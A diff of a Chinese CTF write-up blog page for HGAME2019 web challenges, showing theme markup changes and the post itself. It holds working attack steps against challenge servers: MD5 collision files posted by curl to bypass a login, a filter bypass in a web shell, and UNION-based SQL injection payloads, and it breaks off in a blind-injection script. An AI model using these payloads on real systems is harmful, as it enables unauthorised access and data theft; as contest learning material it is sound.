@@ -1,109 +1,10 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="en">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=6.7.0"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '6.7.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta name="description" content="week-3">
-<meta name="keywords" content="CTF">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="week-3">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HGAME2019-Web-Week3&amp;4">
 <meta property="og:url" content="http://chaosec.top/2019/03/02/hgame2019b/index.html">
 <meta property="og:site_name" content="Aesm1p&#39; Blog">
 <meta property="og:description" content="week-3">
-<meta property="og:locale" content="en">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/19/5c6bde110e9a2.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/26/5c7529f34783c.png">
@@ -111,1428 +12,389 @@
 <meta property="og:image" content="https://i.loli.net/2019/02/26/5c752b920389a.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/27/5c75e272afb23.png">
 <meta property="og:image" content="https://i.loli.net/2019/02/27/5c75f88d0fb45.png">
-<meta property="og:updated_time" content="2019-03-17T13:09:45.519Z">
+<meta property="article:published_time" content="2019-03-02T07:55:12.000Z">
+<meta property="article:modified_time" content="2019-03-17T13:09:45.519Z">
+<meta property="article:author" content="Aesm1p">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HGAME2019-Web-Week3&amp;4">
-<meta name="twitter:description" content="week-3">
-<meta name="twitter:image" content="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png">
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Aesm1p' Blog" type="application/atom+xml"/>
-
-
-
-
-  <link rel="canonical" href="http://chaosec.top/2019/03/02/hgame2019b/"/>
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>HGAME2019-Web-Week3&4 | Aesm1p' Blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
-
-  
-  
-    
-  
-
-  <div class="bg_content">
-    <canvas id="canvas"></canvas>
-  </div>
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Aesm1p' Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <p class="site-subtitle">前方如聂鲁达的爱情诗一般美好</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Toggle navigation bar">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Home</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>About</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-soul">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/soul" rel="section"><i class="menu-item-icon fa fa-fw fa-book"></i> <br/>soul</a>
-
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>Search</a>
-        </li>
-      
-    </ul>
-  
-
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="Searching..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
-</div>
-
-
-
-    </div>
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://chaosec.top/2019/03/02/hgame2019b/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Aesm1p"/>
-      <meta itemprop="description" content="相逢意气为君饮"/>
-      <meta itemprop="image" content="/images/avatar.jpg"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aesm1p' Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">HGAME2019-Web-Week3&4
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-03-02 15:55:12" itemprop="dateCreated datePublished" datetime="2019-03-02T15:55:12+08:00">2019-03-02</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-03-17 21:09:45" itemprop="dateModified" datetime="2019-03-17T21:09:45+08:00">2019-03-17</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="post-meta-item-icon"
-            >
-            <i class="fa fa-eye"></i>
-             Views:  
-            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
-            </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h1 id="week-3"><a href="#week-3" class="headerlink" title="week-3"></a>week-3</h1><a id="more"></a>
-<h2 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h2><p>文件探测一下发现存在备份文件泄露<code>.login.php.swp</code>，核心代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'username'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'password'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'code'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    $code     = (string)$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your input can't be the same"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Good"</span>; </span><br><span class="line">    </span><br><span class="line">        header(<span class="string">'Location: admin.php'</span>);  </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt; Invalid password&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章<a href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">link</a>，有一个工具fastcoll就可以生成两个MD5值相同的不同文件</p>
+<meta name="twitter:image" content="https://i.loli.net/2019/02/19/5c6bdd1d45b16.png"><title>HGAME2019-Web-Week3&amp;4 | Aesm1p' Blog</title><link ref="canonical" href="http://chaosec.top/2019/03/02/hgame2019b/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: undefined,
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: true,
+  fancybox: true,
+  zoomImage: {"gapAside":"50px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-address-card"></i></span><span class="header-nav-menu-item__text">About</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">HGAME2019-Web-Week3&amp;4</h1><div class="post-meta"><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2019-03-17</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">Words</span><span class="post-meta-item__value">3,289</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">Reading</span><span class="post-meta-item__value">31m</span></span></div></header><div class="post-body">
+        <h1 id="week-3">
+          <a href="#week-3" class="heading-link"><i class="fas fa-link"></i></a>week-3</h1>
+      <a id="more"></a>
+
+        <h2 id="神奇的MD5">
+          <a href="#神奇的MD5" class="heading-link"><i class="fas fa-link"></i></a>神奇的MD5</h2>
+      <p>文件探测一下发现存在备份文件泄露<code>.login.php.swp</code>，核心代码如下<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'username'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'password'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'code'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    $code     = (string)$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your input can't be the same"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Good"</span>; </span><br><span class="line">    </span><br><span class="line">        header(<span class="string">'Location: admin.php'</span>);  </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt; Invalid password&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p>
+<p>可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章<span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">link</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，有一个工具fastcoll就可以生成两个MD5值相同的不同文件</p>
 <ol>
-<li><p>先生成两个MD5值相同的文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o test0 test1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p test1 -o test00 test01</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -c 128 test00 &gt; a</span><br><span class="line">tail -c 128 test01 &gt; b</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type test0 a &gt; test10</span><br><span class="line">type test1 b &gt; test11</span><br></pre></td></tr></table></figure>
+<li>先生成两个MD5值相同的文件<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o test0 test1</span><br></pre></td></tr></table></div></figure></li>
+<li>然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p test1 -o test00 test01</span><br></pre></td></tr></table></div></figure></li>
+<li>将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -c 128 test00 &gt; a</span><br><span class="line">tail -c 128 test01 &gt; b</span><br></pre></td></tr></table></div></figure></li>
+<li>执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type test0 a &gt; test10</span><br><span class="line">type test1 b &gt; test11</span><br></pre></td></tr></table></div></figure>
 </li>
 </ol>
 <p>于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode username@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test00 --data-urlencode password@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test01 --data-urlencode code@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test10 http://118.25.89.91:8080/question/login.php -i</span><br></pre></td></tr></table></figure>
-<p>之后可以得到服务器返回的cookie<code>Set-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/</code>，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = str_replace(<span class="string">"flag"</span>,<span class="string">'none'</span>,$cmd);</span><br></pre></td></tr></table></figure></p>
-<p>绕过很简单，通配符与单引号都可以绕过</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode username@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test00 --data-urlencode password@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test01 --data-urlencode code@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test10 http:&#x2F;&#x2F;118.25.89.91:8080&#x2F;question&#x2F;login.php -i</span><br></pre></td></tr></table></div></figure>
+<p>之后可以得到服务器返回的cookie<code>Set-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/</code>，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = str_replace(<span class="string">"flag"</span>,<span class="string">'none'</span>,$cmd);</span><br></pre></td></tr></table></div></figure><br>绕过很简单，通配符与单引号都可以绕过</p>
 <p>payload：<code>cat /fl??</code> OR <code>cat /fl&#39;&#39;ag</code></p>
 <p>flag：<code>hgame{a1c83b66cc504d583c09ea6c20c0dabc}</code></p>
-<h2 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(md5($_GET[<span class="string">"code"</span>]),<span class="number">0</span>,<span class="number">4</span>) === <span class="number">7229</span></span><br></pre></td></tr></table></figure>
+
+        <h2 id="sqli-1">
+          <a href="#sqli-1" class="heading-link"><i class="fas fa-link"></i></a>sqli-1</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(md5($_GET[<span class="string">"code"</span>]),<span class="number">0</span>,<span class="number">4</span>) === <span class="number">7229</span></span><br></pre></td></tr></table></div></figure>
 <p>题目需要验证码，可以爆破一下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999999</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(substr(md5($i), <span class="number">0</span>, <span class="number">4</span>)===<span class="string">'803a'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999999</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(substr(md5($i), <span class="number">0</span>, <span class="number">4</span>)===<span class="string">'803a'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 <p>然后就是常规的数字型注入了，注意每次都要更新一下code值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=4446&amp;id=1 order by 1--+</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=31226&amp;id=-1 union select group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;4446&amp;id&#x3D;1 order by 1--+</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;31226&amp;id&#x3D;-1 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></div></figure>
 <blockquote>
 <p>f1l1l1l1g,words </p>
 </blockquote>
 <p>不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=70176&amp;id=-1 union select group_concat(column_name) from information_schema.columns where table_name=0x66316c316c316c3167--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;70176&amp;id&#x3D;-1 union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x66316c316c316c3167--+</span><br></pre></td></tr></table></div></figure>
 <blockquote>
 <p>f14444444g</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=51097&amp;id=-1 union select f14444444g from f1l1l1l1g--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;51097&amp;id&#x3D;-1 union select f14444444g from f1l1l1l1g--+</span><br></pre></td></tr></table></div></figure>
 <p>flag: <code>hgame{sql1_1s_iNterest1ng}</code></p>
-<h2 id="sqli-2"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</h2><p>依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。</p>
+
+        <h2 id="sqli-2">
+          <a href="#sqli-2" class="heading-link"><i class="fas fa-link"></i></a>sqli-2</h2>
+      <p>依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。</p>
 <p>PS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 